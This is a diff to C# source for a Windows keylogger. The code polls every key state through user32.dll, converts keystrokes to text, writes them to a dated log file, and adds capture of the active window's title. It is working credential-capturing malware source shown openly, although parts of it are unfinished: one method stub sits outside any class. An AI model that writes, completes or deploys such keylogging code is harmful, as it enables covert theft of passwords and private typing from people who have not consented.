@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
+using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
@@ -11,9 +12,19 @@ namespace Keylogger
 {
     static class Program
     {
-
+        // Get keys
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
+
+        //Get window titles
+        [DllImport("user32.dll")]
+        static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll")]
+        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+
+
+
 
         static void Main(string[] args)
         {
@@ -24,7 +35,7 @@ namespace Keylogger
             while (true)
             {
                 Thread.Sleep(100);
-                
+
                 for (int keyCode = 0; keyCode < 255; keyCode++)
                 {
                     int keyState = GetAsyncKeyState(keyCode);
@@ -34,15 +45,16 @@ namespace Keylogger
                         String keyString = "";
 
                         // If shift pressed
-                        if ( 
+                        if (
                             (((Keys)keyCode) == Keys.ShiftKey) ||
                             (((Keys)keyCode) == Keys.LShiftKey) ||
                             (((Keys)keyCode) == Keys.RShiftKey)
-                        ) { 
-                            isShift = !isShift; 
+                        )
+                        {
+                            isShift = !isShift;
                         }
                         // If capital pressed
-                        else  if (((Keys)keyCode) == Keys.Capital)
+                        else if (((Keys)keyCode) == Keys.Capital)
                         {
                             isCapital = !isCapital;
                         }
@@ -51,10 +63,10 @@ namespace Keylogger
                         if (
                                 (!isShift && !isCapital) &&
                                 (keyCode >= 65 && keyCode <= 90)
-                            ) 
+                            )
                         {
-                           keyString = ((Keys)keyCode).ToString().ToLower(); // Convert from ASCII to STRING        
-                        } 
+                            keyString = ((Keys)keyCode).ToString().ToLower(); // Convert from ASCII to STRING        
+                        }
                         else
                         {
                             // Replace caracters
@@ -70,7 +82,7 @@ namespace Keylogger
                             {
                                 keyString = ((Keys)keyCode).ToString().Substring(6);
                             }
-                            
+
                             else if ((keyCode < 65 || keyCode > 90))
                             {
                                 keyString = "<" + ((Keys)keyCode).ToString().ToUpper() + ">";
@@ -80,9 +92,9 @@ namespace Keylogger
                             {
                                 keyString = ((Keys)keyCode).ToString(); // Convert from ASCII to STRING
                             }
-                            
+
                         }
-                        
+
                         // Remove the shift
                         if (
                             (isShift) &&
@@ -91,24 +103,44 @@ namespace Keylogger
                                 (((Keys)keyCode) != Keys.LShiftKey) ||
                                 (((Keys)keyCode) != Keys.RShiftKey)
                             )
-                        ) {
+                        )
+                        {
                             isShift = false;
                         }
 
-                        // Write the logs
+                        // Write the log
+                        text = text + keyString;
 
                         // https://docs.microsoft.com/fr-fr/dotnet/standard/io/how-to-write-text-to-a-file
                         string path = System.IO.Path.GetDirectoryName(Application.ExecutablePath);
                         string fileName = "log-" + DateTime.UtcNow.ToString("MM-dd-yyyy") + ".log";
                         File.WriteAllText(Path.Combine(path, fileName), text);
-                       
-                        text = text + keyString;
+
+
                         Console.WriteLine(text);
+
+                        const int nChars = 256;
+                        StringBuilder Buff = new StringBuilder(nChars);
+                        IntPtr handle = GetForegroundWindow();
+                        string windowTitle = "";
+                        if (GetWindowText(handle, Buff, nChars) > 0)
+                        {
+                            windowTitle = Buff.ToString();
+                        }
+                            
+                        Console.WriteLine("windowTitle : " + windowTitle);
                     }
                 }
             }
 
         }
 
+        
+
+    }
+
+    public string GetundWindowTitle()
+    {
+        return "test";
     }
 }
